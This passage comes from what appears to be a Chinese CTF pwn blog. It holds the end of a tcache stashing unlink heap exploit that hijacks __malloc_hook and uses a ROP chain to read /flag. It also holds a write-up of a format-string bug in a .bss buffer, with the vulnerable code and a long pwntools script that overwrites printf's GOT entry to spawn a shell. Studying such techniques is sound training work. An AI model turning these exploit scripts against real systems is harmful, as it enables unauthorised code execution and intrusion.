class="string">&#x27;2.29/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">idx,n</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,n</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendafter(<span class="string">&#x27;:&#x27;</span>,n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">backdoor</span>(<span class="params">c</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;50056&#x27;</span>)</span><br><span class="line">p.send(c)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x218</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;z&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">heap = u64(p.recvuntil(<span class="string">&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">print(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">dele(<span class="number">0</span>)<span class="comment">#unsortedbin</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)) - (<span class="number">0x7fd7469b7ca0</span> - <span class="number">0x7fd7467d3000</span>)</span><br><span class="line">print(<span class="string">&quot;libcbase:&quot;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;x&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x180</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    dele(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x370</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">pay = <span class="string">&#x27;d&#x27;</span>*<span class="number">0x370</span></span><br><span class="line">pay+= p64(<span class="number">0</span>) + p64(<span class="number">0x91</span>)</span><br><span class="line">pay+= p64(heap+<span class="number">0x180</span>) + p64(heap-<span class="number">0x260</span>+<span class="number">0x20</span>)<span class="comment">#fd bk </span></span><br><span class="line">edit(<span class="number">1</span>,pay)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;e&#x27;</span>*<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">malloc_hook = libcbase+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">print(<span class="string">&quot;malloc_hook:&quot;</span>+<span class="built_in">hex</span>(malloc_hook))</span><br><span class="line">edit(<span class="number">0</span>,p64(malloc_hook))</span><br><span class="line"></span><br><span class="line">backdoor(<span class="string">&#x27;/flag\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add_rsp = libcbase+<span class="number">0x8CFD6</span><span class="comment">#add 0x48,ret </span></span><br><span class="line">pop_rdi = libcbase+<span class="number">0x26542</span></span><br><span class="line">pop_rsi = libcbase+<span class="number">0x26f9e</span></span><br><span class="line">pop_rdx = libcbase+<span class="number">0x12bda6</span></span><br><span class="line">pop_rax = libcbase+<span class="number">0x47cf8</span></span><br><span class="line">syscall = libcbase+<span class="number">0x10D022</span></span><br><span class="line"><span class="comment">#open</span></span><br><span class="line">rop =  p64(pop_rdi)+p64(heap)</span><br><span class="line">rop += p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rax)+p64(<span class="number">2</span>)</span><br><span class="line">rop += p64(syscall)</span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">read = libcbase+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">rop += p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">rop += p64(pop_rsi)+p64(heap)</span><br><span class="line">rop += p64(pop_rdx)+p64(<span class="number">0x30</span>)</span><br><span class="line">rop += p64(read)</span><br><span class="line"><span class="comment">#write</span></span><br><span class="line">write = libcbase+libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">rop += p64(pop_rdi)+p64(<span class="number">1</span>)</span><br><span class="line">rop += p64(pop_rsi)+p64(heap)</span><br><span class="line">rop += p64(pop_rdx)+p64(<span class="number">0x30</span>)</span><br><span class="line">rop += p64(write)</span><br><span class="line"></span><br><span class="line">backdoor(p64(add_rsp))</span><br><span class="line">add(<span class="number">1</span>,rop)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">chunk 0x000000000004040</span></span><br><span class="line"><span class="string">addr 0x4030</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><hr><p>参考链接</p><p><a href="https://www.anquanke.com/post/id/198173?display=mobile">https://www.anquanke.com/post/id/198173?display=mobile</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-lore/">https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-lore/</a></p><p><a href="https://cloud.tencent.com/developer/article/1705462">https://cloud.tencent.com/developer/article/1705462</a></p><p><a href="https://blog.csdn.net/qq_41202237/article/details/113604261">https://blog.csdn.net/qq_41202237/article/details/113604261</a> (Tcache Stashing Unlink Attack)</p>]]></content>
      
      
      <categories>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 堆 </tag>
            
            <tag> smallbin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格式化字符串漏洞之bss</title>
      <link href="/2021/11/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bbss/"/>
      <url>/2021/11/22/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E4%B9%8Bbss/</url>
      
        <content type="html"><![CDATA[<p>当格式化字符串写在栈上时，可以利用 ‘%n$p’ 来泄露 地址 和 canary ，用 ‘%n$hhn’ 根据偏移覆盖地址，改地址</p><p>并且此时偏移时很好计算的，用 <code>AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p...</code> 就可以解决</p><hr><p>但是，当格式化字符串写在 bss 上时，偏移就不能根据以上方法来计算了</p><p>此时得利用栈来当作跳板形成链子，改函数的 got 表，达到劫持效果 <strong>( 前提 :  RELRO  保护不为 FULL RELRO )</strong></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/geshihua/1637583342983401/768fdc90c922f4f1c8e6e638445a0f5fdb8f1bdb.png" alt="image-20211122201542735"></p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_804854B</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input your password: &quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    s1[read(<span class="number">0</span>, s1, <span class="number">0x32</span>u)] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(s1, <span class="string">&quot;wllmmllw&quot;</span>, <span class="number">8u</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is the wrong password: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(s1); <span class="comment">//格式化字符串漏洞</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Login successfully! Have fun!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------------------------------------------------------------</span><br><span class="line">.bss:<span class="number">0804B</span>0A0 ; <span class="keyword">char</span> s1[<span class="number">52</span>]</span><br><span class="line">.bss:<span class="number">0804B</span>0A0 s1              db ?                    ; DATA XREF: sub_804854B+<span class="number">1B</span>↑o</span><br><span class="line">.bss:<span class="number">0804B</span>0A0                                         ; sub_804854B+<span class="number">2</span>A↑w ...</span><br><span class="line">.bss:<span class="number">0804B</span>0A1                 db    ? ;</span><br><span class="line">.bss:<span class="number">0804B</span>0A2                 db    ? ;</span><br><span class="line">.bss:<span class="number">0804B</span>0A3                 db    ? ;</span><br><span class="line">.bss:<span class="number">0804B</span>0A4                 db    ? ;</span><br><span class="line">.bss:<span class="number">0804B</span>0A5                 db    ? ;</span><br><span class="line">.bss:<span class="number">0804B</span>0A6                 db    ? ;</span><br><span class="line">.bss:<span class="number">0804B</span>0A7                 db    ? ;</span><br><span class="line">.bss:<span class="number">0804B</span>0A8                 db    ? ;</span><br><span class="line">.bss:<span class="number">0804B</span>0A9                 db    ? ;</span><br></pre></td></tr></table></figure><p>存在格式化字符串漏洞，并且写在 bss 段上</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先用以下代码测试一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>将断点下在漏洞处,即函数 printf 调用完成后</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/geshihua/1637583805763738/41bba578e9eb1166607bc415da33ec97c22ed102.png" alt="image-20211122202325535"></p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/geshihua/1637583879670807/71159476cb160276b64432212a5129a97baed5f4.png" alt="image-20211122202439521"></p><p>可以发现偏移为 6 和 10 处可以形成一条链子，我们可以通过 6 来调整位置，再通过 10 来写入我们想写的地址</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/geshihua/1637583981498499/4a760d46bc31e042c413aacb2285f49bccccc50a.png" alt="image-20211122202621272"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">print(<span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%12$p&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">libcbase = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">2132336</span>-<span class="number">0x40</span></span><br><span class="line">print(<span class="built_in">hex</span>(libcbase))</span><br><span class="line">system = libcbase + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">print(<span class="string">&quot;system: &quot;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%6$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">leak_6 = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;6: &quot;</span> + <span class="built_in">hex</span>(leak_6)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;%10$p&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">leak_10 = <span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;10: &quot;</span> + <span class="built_in">hex</span>(leak_10)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x14</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">1</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xb0</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">2</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x04</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">3</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x08</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"><span class="comment">##########</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">4</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x15</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">5</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xb0</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">6</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x04</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">7</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x08</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"><span class="comment">###########</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">8</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x16</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">9</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xb0</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">10</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x04</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((leak_10 &amp; <span class="number">0xff</span>) + <span class="number">11</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%6$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0x08</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%10$hhn&#x27;</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">pay = <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>((system &amp; <span class="number">0xff</span>)) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%14$hhn&#x27;</span></span><br><span class="line">pay += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((system&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>)+<span class="number">0x20</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%15$hhn&#x27;</span></span><br><span class="line">pay += <span class="string">&#x27;%&#x27;</span> + <span class="built_in">str</span>(((system&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>)+<span class="number">0x6e</span>) + <span class="string">&#x27;c&#x27;</span>+ <span class="string">&#x27;%16$hhn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(pay)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;!&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>还有一种是双字节写入，原理是一样的，更快一些</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 